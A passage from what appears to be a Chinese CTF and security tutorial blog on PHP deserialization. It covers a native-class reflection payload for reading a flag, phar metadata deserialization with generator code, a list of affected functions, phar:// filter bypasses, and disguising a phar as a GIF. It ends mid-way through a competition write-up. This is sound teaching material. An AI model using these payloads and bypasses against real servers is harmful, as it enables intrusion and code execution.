class="title">f</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">g</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">h</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">i</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">j</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">k</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">l</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">m</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">n</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">o</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">p</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">q</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">r</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">s</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">t</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$rc</span>=<span class="variable">$_GET</span>[<span class="string">&quot;rc&quot;</span>];    <span class="comment">// ä¼ å…¥åŸç”Ÿç±»å</span></span><br><span class="line"><span class="variable">$rb</span>=<span class="variable">$_GET</span>[<span class="string">&quot;rb&quot;</span>];    <span class="comment">// ä¼ å…¥ç±»å±æ€§</span></span><br><span class="line"><span class="variable">$ra</span>=<span class="variable">$_GET</span>[<span class="string">&quot;ra&quot;</span>];    <span class="comment">// ä¼ å…¥ç±»å±æ€§</span></span><br><span class="line"><span class="variable">$rd</span>=<span class="variable">$_GET</span>[<span class="string">&quot;rd&quot;</span>];    <span class="comment">// ä¼ å…¥ç±»æ–¹æ³•</span></span><br><span class="line"><span class="variable">$method</span>= <span class="keyword">new</span> <span class="variable">$rc</span>(<span class="variable">$ra</span>, <span class="variable">$rb</span>);    <span class="comment">// å®ä¾‹åŒ–åˆšæ‰ä¼ å…¥çš„åŸç”Ÿç±»</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$method</span>-&gt;<span class="variable">$rd</span>());     <span class="comment">// è°ƒç”¨ç±»ä¸­çš„æ–¹æ³•</span></span><br></pre></td></tr></table></figure>
<p>é¦–å…ˆçœ‹åˆ°è¿™ä¸¤è¡Œä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$method</span>= <span class="keyword">new</span> <span class="variable">$rc</span>(<span class="variable">$ra</span>, <span class="variable">$rb</span>);  </span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$method</span>-&gt;<span class="variable">$rd</span>());</span><br></pre></td></tr></table></figure>
<p>ç±»ä¼¼äºä¸Šé¢çš„é¢˜ï¼Œéœ€è¦åˆ©ç”¨åŸç”Ÿç±»</p>
<p>è¿™ä¸ªé¢˜ï¼Œæˆ‘å¼€å§‹æƒ³åˆ°è¿˜æ˜¯ç”¨<code>FilesystemIterator</code></p>
<p>å¦‚æœå¾—åˆ°æ–‡ä»¶è·¯å¾„ï¼Œç„¶åè¿˜æ˜¯ç”¨<code>SplFileObject</code>æ¥è¯»å–æ–‡ä»¶å†…å®¹</p>
<p>ä½†æ˜¯è¿™ä¸ªè€ƒ<code>ReflectionMethod</code></p>
<p>çŒœæµ‹flagåœ¨æ³¨é‡Šä¸­</p>
<p>ç›´æ¥æ„é€ payload,å³å¯å¾—åˆ°flag</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?rc=ReflectionMethod&amp;ra=User&amp;rb=a&amp;rd=getDocComment</span><br></pre></td></tr></table></figure>
<h3 id="pharååºåˆ—åŒ–"><a class="markdownIt-Anchor" href="#pharååºåˆ—åŒ–"></a> Pharååºåˆ—åŒ–</h3>
<p>pharååºåˆ—åŒ–å³åœ¨æ–‡ä»¶ç³»ç»Ÿå‡½æ•°ï¼ˆ<code>file_exists()</code>ã€<code>is_dir()</code>ç­‰ï¼‰å‚æ•°å¯æ§çš„æƒ…å†µä¸‹ï¼Œé…åˆ<code>phar://ä¼ªåè®®</code>ï¼Œå¯ä»¥ä¸ä¾èµ–<code>unserialize()</code>ç›´æ¥è¿›è¡Œååºåˆ—åŒ–æ“ä½œã€‚</p>
<h4 id="åŸç†"><a class="markdownIt-Anchor" href="#åŸç†"></a> åŸç†</h4>
<p>é¦–å…ˆäº†è§£ä¸€ä¸‹pharæ–‡ä»¶çš„ç»“æ„ï¼Œä¸€ä¸ªpharæ–‡ä»¶ç”±å››éƒ¨åˆ†æ„æˆï¼š</p>
<ul>
<li>
<p>a <strong>stub</strong>ï¼šå¯ä»¥ç†è§£ä¸ºä¸€ä¸ªæ ‡å¿—ï¼Œæ ¼å¼ä¸º<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>ï¼Œå‰é¢å†…å®¹ä¸é™ï¼Œä½†å¿…é¡»ä»¥<code>__HALT_COMPILER();?&gt;</code>æ¥ç»“å°¾ï¼Œå¦åˆ™pharæ‰©å±•å°†æ— æ³•è¯†åˆ«è¿™ä¸ªæ–‡ä»¶ä¸ºpharæ–‡ä»¶ã€‚</p>
</li>
<li>
<p>a <strong>manifest</strong> describing the contentsï¼špharæ–‡ä»¶æœ¬è´¨ä¸Šæ˜¯ä¸€ç§å‹ç¼©æ–‡ä»¶ï¼Œå…¶ä¸­æ¯ä¸ªè¢«å‹ç¼©æ–‡ä»¶çš„æƒé™ã€å±æ€§ç­‰ä¿¡æ¯éƒ½æ”¾åœ¨è¿™éƒ¨åˆ†ã€‚è¿™éƒ¨åˆ†è¿˜ä¼šä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„<strong>meta-data</strong>ï¼Œè¿™æ˜¯ä¸Šè¿°æ”»å‡»æ‰‹æ³•æœ€æ ¸å¿ƒçš„åœ°æ–¹ã€‚</p>
</li>
<li>
<p>the file <strong>contents</strong>ï¼šè¢«å‹ç¼©æ–‡ä»¶çš„å†…å®¹ã€‚</p>
</li>
<li>
<p>[optional] a <strong>signature</strong> for verifying Phar integrity (phar file format only)ï¼šç­¾åï¼Œæ”¾åœ¨æœ«å°¾ï¼Œç”¨äºç¡®è®¤pharæ–‡ä»¶å®Œæ•´æ€§ã€‚</p>
</li>
</ul>
<h4 id="demo-2"><a class="markdownIt-Anchor" href="#demo-2"></a> Demo</h4>
<p>æ³¨ï¼šç”Ÿæˆpharæ–‡ä»¶éœ€è¦å°†php.iniä¸­çš„phar.readonlyé€‰é¡¹è®¾ç½®ä¸ºoffï¼Œå¦åˆ™æ— æ³•ç”Ÿæˆpharæ–‡ä»¶</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221007152134587-166727395787412.png" alt="meta-data"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;&#125;</span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);<span class="comment">//åç¼€åå¿…é¡»ä¸ºphar</span></span><br><span class="line"><span class="variable">$phar</span> -&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span> -&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>); <span class="comment">//è®¾ç½®stub</span></span><br><span class="line"><span class="variable">$phar</span> -&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);<span class="comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span></span><br><span class="line"><span class="variable">$phar</span> -&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);<span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line"><span class="comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class="line"><span class="variable">$phar</span> -&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>è®¿é—®ä¹‹åå°±ä¼šç”Ÿæˆphar.pharæ–‡ä»¶ï¼Œæ‰“å¼€æŸ¥çœ‹ï¼Œä¼šçœ‹åˆ°meta-dataæ˜¯ä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨çš„ï¼š</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221007150717433-166727395787413.png" alt="meta-data"></p>
<p>æœ‰åºåˆ—åŒ–æ•°æ®å¿…ç„¶ä¼šæœ‰ååºåˆ—åŒ–æ“ä½œï¼Œphpä¸€å¤§éƒ¨åˆ†çš„æ–‡ä»¶ç³»ç»Ÿå‡½æ•°åœ¨é€šè¿‡<code>phar://</code>ä¼ªåè®®è§£æpharæ–‡ä»¶æ—¶ï¼Œéƒ½ä¼šå°†meta-dataè¿›è¡Œååºåˆ—åŒ–ï¼Œæµ‹è¯•åå—å½±å“çš„å‡½æ•°å¦‚ä¸‹ï¼š</p>
<table>
<thead>
<tr>
<th>filename</th>
<th>filectime</th>
<th>file_exists</th>
<th>file_get_contents</th>
</tr>
</thead>
<tbody>
<tr>
<td>file_put_conents</td>
<td>file</td>
<td>filegroup</td>
<td>fopen</td>
</tr>
<tr>
<td>fileinode</td>
<td>filemtime</td>
<td>fileowner</td>
<td>fileperms</td>
</tr>
<tr>
<td>is_dir</td>
<td>is_executable</td>
<td>is_file</td>
<td>is_link</td>
</tr>
<tr>
<td>is_readable</td>
<td>is_writable</td>
<td>is_writeable</td>
<td>parse_ini_file</td>
</tr>
<tr>
<td>copy</td>
<td>unlink</td>
<td>stat</td>
<td>readfile</td>
</tr>
</tbody>
</table>
<p>å®é™…ä¸Šï¼Œåªè¦è°ƒç”¨äº†<code>php_stream_open_wrapper</code>çš„å‡½æ•°ï¼Œéƒ½å­˜åœ¨è¿™æ ·çš„é—®é¢˜ï¼Œå› æ­¤å—å½±å“çš„è¿˜æœ‰ä¸‹åˆ—å‡½æ•°ï¼š</p>
<p><strong>exif</strong></p>
<ul>
<li><code>exif_thumbnail</code></li>
<li><code>exif_imagetype</code></li>
</ul>
<p><strong>gd</strong></p>
<ul>
<li><code>imageloadfont</code></li>
<li><code>imagecreatefrom</code></li>
</ul>
<p><strong>hash</strong></p>
<ul>
<li><code>hash_hmac_file</code></li>
<li><code>hash_file</code></li>
<li><code>hash_update_file</code></li>
<li><code>md5_file</code></li>
<li><code>sha1_file</code></li>
</ul>
<p><strong>file / url</strong></p>
<ul>
<li><code>get_meta_tags</code></li>
<li><code>get_headers</code></li>
<li><code>mime_content_type</code></li>
</ul>
<p><strong>standard</strong></p>
<ul>
<li><code>getimagesize</code></li>
<li><code>getimagesizefromstring</code></li>
</ul>
<p><strong>finfo</strong></p>
<ul>
<li><code>finfo_file</code></li>
<li><code>finfo_buffer</code></li>
</ul>
<p><strong>zip</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$zip</span> = <span class="keyword">new</span> <span class="title class_">ZipArchive</span>();</span><br><span class="line"><span class="variable">$res</span> = <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="string">&#x27;TW.zip&#x27;</span>);</span><br><span class="line"><span class="variable">$zip</span> -&gt;<span class="title function_ invoke__">extractTo</span>(<span class="string">&#x27;phar://phar.phar/***&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p><strong>Postgres</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pdo</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;pgsql:host%s;dbname=%s;user=%s;password=%s;&quot;</span>,<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;postgres&quot;</span>,<span class="string">&quot;TW&quot;</span>,<span class="string">&#x27;123520&#x27;</span>));</span><br><span class="line">@<span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">pgsqlCopyFromFile</span>(<span class="string">&#x27;aa&#x27;</span>,<span class="string">&#x27;phar://phar.phar/aaa&#x27;</span>);</span><br></pre></td></tr></table></figure>
<h4 id="trick"><a class="markdownIt-Anchor" href="#trick"></a> Trick</h4>
<p>è¿‡æ»¤äº†phar://åè®®ï¼Œç»•è¿‡å§¿åŠ¿ï¼š</p>
<ul>
<li><code>compress.bzip2://phar://</code></li>
<li><code>compress.zlib://phar:///</code></li>
<li><code>php://filter/resource=phar://</code></li>
</ul>
<blockquote>
<p>åŒæ—¶ï¼Œè¿˜å¯ä»¥å°†ä¼ªé€ pharä¸ºå…¶ä»–æ ¼å¼çš„æ–‡ä»¶ã€‚</p>
<p>phpè¯†åˆ«pharæ–‡ä»¶æ˜¯é€šè¿‡å…¶æ–‡ä»¶å¤´çš„stubï¼Œæ›´ç¡®åˆ‡ä¸€ç‚¹æ¥è¯´æ˜¯<code>__HALT_COMPILER();?&gt;</code>è¿™æ®µä»£ç ï¼Œå¯¹å‰é¢çš„å†…å®¹æˆ–è€…åç¼€åæ˜¯æ²¡æœ‰è¦æ±‚çš„ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ·»åŠ ä»»æ„çš„æ–‡ä»¶å¤´+ä¿®æ”¹åç¼€åçš„æ–¹å¼å°†pharæ–‡ä»¶ä¼ªè£…æˆå…¶ä»–æ ¼å¼çš„æ–‡ä»¶ã€‚å¦‚ä¸‹ï¼š</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//è®¾ç½®stubï¼Œå¢åŠ gifæ–‡ä»¶å¤´</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//å°†è‡ªå®šä¹‰meta-dataå­˜å…¥manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line">    <span class="comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221007234558245-166727395787414.png" alt="ä¼ªé€ "></p>
<p>ç†è®ºåˆ°è¿™å°±å·®ä¸å¤šäº†ï¼Œæ¥ä¸‹æ¥è®²ä¸€ä¸ª2022MTå†³èµ›çš„å¤ç°é¢˜ç›®ï¼Œè®²ä¸æ˜ç™½çš„è¯ï¼Œå¸ˆå‚…ä»¬è®°å¾—é”¤æˆ‘ã€‚</p>
<h4 id="æ¼æ´æ¡ä»¶"><a class="markdownIt-Anchor" href="#æ¼æ´æ¡ä»¶"></a> æ¼æ´æ¡ä»¶</h4>
<p>1ã€pharæ–‡ä»¶èƒ½å¤Ÿä¸Šä¼ è‡³æœåŠ¡å™¨<br>
å³è¦æ±‚å­˜åœ¨file_get_contents()ã€fopen()è¿™ç§å‡½æ•°</p>
<p>2ã€è¦æœ‰å¯åˆ©ç”¨çš„é­”æœ¯æ–¹æ³•<br>
è¿™ä¸ªçš„è¯ç”¨ä¸€ä½å¤§å¸ˆå‚…çš„è¯è¯´å°±æ˜¯åˆ©ç”¨é­”æœ¯æ–¹æ³•ä½œä¸º&quot;è·³æ¿&quot;</p>
<p>3ã€æ–‡ä»¶æ“ä½œå‡½æ•°çš„å‚æ•°å¯æ§ï¼Œä¸”:ã€/ã€pharç­‰ç‰¹æ®Šå­—ç¬¦æ²¡æœ‰è¢«è¿‡æ»¤<br>
ä¸€èˆ¬åˆ©ç”¨å§¿åŠ¿æ˜¯ä¸Šä¼ Pharæ–‡ä»¶åé€šè¿‡ä¼ªåè®®Pharæ¥å®ç°ååºåˆ—åŒ–ï¼Œä¼ªåè®®Pharæ ¼å¼æ˜¯<code>Phar://</code>è¿™ç§ï¼Œå¦‚æœè¿™å‡ ä¸ªç‰¹æ®Šå­—ç¬¦è¢«è¿‡æ»¤å°±æ— æ³•å®ç°ååºåˆ—åŒ–</p>
<h4 id="èµ›é¢˜å¤ç°"><a class="markdownIt-Anchor" href="#èµ›é¢˜å¤ç°"></a> èµ›é¢˜å¤ç°</h4>
<h5 id="mtctf2022å†³èµ›"><a class="markdownIt-Anchor" href="#mtctf2022å†³èµ›"></a> <s>MTCTF2022å†³èµ›</s></h5>
<p>è‡ªå·±èµ·äº†ä¸€ä¸ªdockerï¼Œæˆ‘ä»¬å…ˆå¤§æ¦‚çœ‹ä¸€ä¸‹é¢˜ç›®å§ã€‚</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221008000647522-166727395787415.png" alt="test01"></p>
<p>æ–‡ä»¶ä¸Šä¼ å…ˆç®€å•çš„ä¼ ä¸ªæ–‡ä»¶æŠ“ä¸ªåŒ…çœ‹ä¸€ä¸‹ï¼Œ</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221008002817077-166727395787416.png" alt="test02"></p>
<p>è¿™é‡Œè¿˜æ²¡æœ‰å»çœ‹æºç ï¼Œçœ‹åˆ°è¿™ä¸ªï¼Œå°±éšä¾¿ä¸Šä¼ äº†ä¸€ä¸ªç è¯•äº†ä¸€ä¸‹ï¼Œå‘ç°å›¾ç‰‡ä¸Šä¼ åè¢«å‘é€åˆ°ä¸€ä¸ªå‡½æ•°ä¸­å¤„ç†ã€‚è¿™é‡Œå°±æ„è¯†åˆ°ä¸æ˜¯ç®€å•çš„æ–‡ä»¶ä¸Šä¼ äº†ï¼Œå†³èµ›æ—¶ä¹Ÿå»å•ƒæºç äº†ï¼Œä½†æ˜¯æ²¡æ€ä¹ˆå•ƒæ˜ç™½ï¼Œå¤ç°æ—¶é—´è¶³å¤Ÿå¤šï¼Œåœ¨åŠ ä¸ŠMaxzedå¤§å¸ˆå‚…çš„wpæ€»ç®—å•ƒæ˜ç™½äº†ï¼Œæºç å¤ªå¤šï¼Œæˆ‘å°±æˆªé‡ç‚¹æ¥è¯´å§ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$image</span>, ProcessorInterface <span class="variable">$processor</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;image = <span class="variable">$image</span>;</span><br><span class="line"></span><br><span class="line">		<span class="variable language_">$this</span>-&gt;processor = <span class="variable">$processor</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Make sure that the image exists</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;image) === <span class="literal">false</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">PixlException</span>(<span class="title function_ invoke__">vsprintf</span>(<span class="string">&#x27;The image [ %s ] does not exist.&#x27;</span>, [<span class="variable">$this</span>-&gt;image]));</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Set the image</span></span><br><span class="line"></span><br><span class="line">		<span class="variable language_">$this</span>-&gt;processor-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$image</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œçœ‹Maxzedå¸ˆå‚…çš„wpæ²¡çœ‹å‡ºæ¥ä»–æ€ä¹ˆåˆ¤æ–­å­˜åœ¨pharååºåˆ—åŒ–æ¼æ´ï¼Œè¿™é‡Œè‡ªå·±åˆå»ç»†çœ‹äº†ä¸€ä¸‹æºç ã€‚</p>
<p><s>å…‰çœ‹è¿™ä¸ªæ˜¯æ²¡æœ‰ä»»ä½•æ€è·¯çš„ï¼Œå†æˆªä¸€æ®µé‡è¦çš„æºç è¯´ä¸€ä¸‹ï¼Œå¼€è®²å‰è‚¯å®šå§æºç å‘åˆ°ç¾¤é‡Œäº†ï¼Œå¸ˆå‚…ä»¬æœ‰æƒ³æ³•çš„å¯ä»¥è‡ªå–ã€‚</s></p>
<p>æŒ‰ç…§pharååºåˆ—åŒ–çš„æƒ¯ä¾‹å°±æ˜¯è¦æ‰¾å¯æ§çš„å‡½æ•°ï¼Œé‚£å°±æ‰¾å§<s>å®¡é‚£ä¹ˆå¤§ä¸€ä¸ªç©æ„å„¿ç¡®å®éš¾å—</s></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ImagesController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">home</span>(<span class="params">ViewFactory <span class="variable">$view</span></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">		<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;/var/www/mako/uploads&#x27;</span>);</span><br><span class="line">		<span class="variable">$fileNames</span> = <span class="title function_ invoke__">array_diff</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;.&#x27;</span>), <span class="keyword">array</span>(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;..&#x27;</span>));</span><br><span class="line">		<span class="variable">$images</span> = [];</span><br><span class="line">		<span class="keyword">foreach</span>(<span class="variable">$fileNames</span> <span class="keyword">as</span> <span class="variable">$index</span> =&gt; <span class="variable">$fileName</span>) &#123;<span class="comment">//æ¯æ¬¡å¾ªç¯ä¸­ï¼Œå½“å‰æ•°ç»„å…ƒç´ çš„å€¼è¢«èµ‹ç»™ $fileNameï¼Œå½“å‰æ•°ç»„å…ƒç´ çš„é”®åä¹Ÿä¼šåœ¨æ¯æ¬¡å¾ªç¯ä¸­è¢«èµ‹ç»™å˜é‡ $indexã€‚å¹¶ä¸”æ•°ç»„å†…éƒ¨çš„æŒ‡é’ˆå‘å‰ç§»ä¸€æ­¥ï¼ˆå› æ­¤ä¸‹ä¸€æ¬¡å¾ªç¯ä¸­å°†ä¼šå¾—åˆ°ä¸‹ä¸€ä¸ªæ•°ç»„å…ƒç´ ï¼‰ï¼Œç›´åˆ°éå†åˆ°æ•°ç»„çš„æœ«å°¾ï¼Œåœæ­¢éå†å¹¶é€€å‡ºå¾ªç¯ã€‚</span></span><br><span class="line">			<span class="variable">$images</span>[<span class="variable">$fileName</span>] = <span class="string">&#x27;data:image/&#x27;</span> . <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$fileName</span>, PATHINFO_EXTENSION) . <span class="string">&#x27;;base64,&#x27;</span> . <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$fileName</span>));<span class="comment">//å¯¹æ¯æ¬¡å¾ªç¯çš„fileNameè¿›è¡Œbase64ç¼–ç </span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;view-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&#x27;images&#x27;</span>, <span class="variable">$images</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$view</span>-&gt;<span class="title function_ invoke__">render</span>(<span class="string">&#x27;home&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;/var/www/mako/uploads&#x27;</span>);</span><br><span class="line">		<span class="variable">$imageFile</span> 